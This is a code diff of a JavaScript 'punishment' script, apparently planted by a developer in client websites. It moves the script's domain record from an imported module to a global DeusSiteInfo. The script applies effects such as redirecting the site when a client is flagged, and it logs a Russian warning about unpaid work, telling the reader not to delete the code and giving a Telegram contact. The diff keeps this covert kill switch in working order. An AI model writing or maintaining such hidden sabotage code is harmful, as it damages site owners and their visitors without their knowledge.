@@ -6,9 +6,6 @@
  * Данный скрипт отвечает за наказание.
  */
 
-// Массив с найденными данными
-import { siteInfo } from './bd.js';
-
 // Массив с эффектами
 const effects = {
   //redirect - редирект на redirecturl
@@ -51,17 +48,17 @@ const effects = {
   // Функция для проверки домена
   function checkDomain() {
 
-    console.log("Site Info:", siteInfo);
+    console.log("Site Info:", DeusSiteInfo);
 
     // Применение эффекта, если домен найден в списке
-    const effectFunction = effects[siteInfo.blocker_effect];
+    const effectFunction = effects[DeusSiteInfo.blocker_effect];
     if (effectFunction) {
-        effectFunction(siteInfo.blocker_redirecturl || siteInfo.blocker_date);
+        effectFunction(DeusSiteInfo.blocker_redirecturl || DeusSiteInfo.blocker_date);
     }
         
     // Проверка, если case у домена равен "didnt pay"
-    if (siteInfo && siteInfo.blocker_cause === "didnt pay") {
-        console.log(`Этот заказчик ${siteInfo.blocker_date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
+    if (DeusSiteInfo && DeusSiteInfo.blocker_cause === "didnt pay") {
+        console.log(`Этот заказчик ${DeusSiteInfo.blocker_date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
       }
   }
 
